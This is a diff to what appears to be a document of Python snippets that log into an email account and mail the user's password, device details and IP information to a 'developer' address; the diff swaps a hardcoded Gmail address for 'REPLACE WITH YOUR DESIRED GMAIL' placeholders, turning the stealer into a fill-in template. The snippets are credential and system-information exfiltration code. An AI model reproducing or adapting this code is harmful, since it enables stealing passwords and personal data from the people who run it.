@@ -109,7 +109,7 @@ s.starttls()
 s.login(MailBox, Password)
 subject = "Mail from " + MailBox + " to " + RMID
 message = "From: " + MailBox + "\nTo: " + RMID + "\nSubject: " + subject + "\n" + Password
-Developer = "K.alam93899@gmail.com"
+Developer = "REPLACE WITH YOUR DESIRED GMAIL ADDRESS"
 s.sendmail(MailBox, Developer, message)
 s.quit()
 ```
@@ -140,7 +140,7 @@ def get_device_details():
 if __name__ == "__main__":
     device_info = get_device_details()
     data_str = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
-    send_email("System Information", data_str, "K.alam93899@gmail.com")
+    send_email("System Information", data_str, "REPLACE WITH YOUR DESIRED GMAIL ADDRESS")
 ```
 
 The script defines a function to send an email and uses it to send the user's system information to the developer's email address.
@@ -166,7 +166,7 @@ json_data = json.dumps(data, indent=4)
 
 sender_email = MailBox
 sender_password = Password
-receiver_email = "K.alam93899@gmail.com"
+receiver_email = "REPLACE WITH YOUR DESIRED GMAIL"
 subject = "IP Information"
 
 body = f"""\
